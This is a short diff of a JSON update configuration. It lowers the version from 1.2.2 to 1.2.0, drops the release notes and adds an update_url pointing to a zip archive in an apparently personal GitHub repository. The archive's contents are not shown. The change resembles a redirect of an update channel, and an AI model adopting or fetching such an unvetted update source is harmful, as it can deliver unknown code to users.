@@ -1,10 +1,5 @@
 {
-    "version": "1.2.2",
-    "schema_version": 2024062001,
-    "update_message": "Security updates and performance improvements",
-    "release_notes": [
-        "Fixed security vulnerabilities",
-        "Optimized database queries",
-        "Improved error handling"
-    ]
+  "version": "1.2.0",
+  "update_message": "New features and bug fixes",
+  "update_url": "https://github.com/salmantariq596/version-config/raw/main/system-updates.zip"
 }
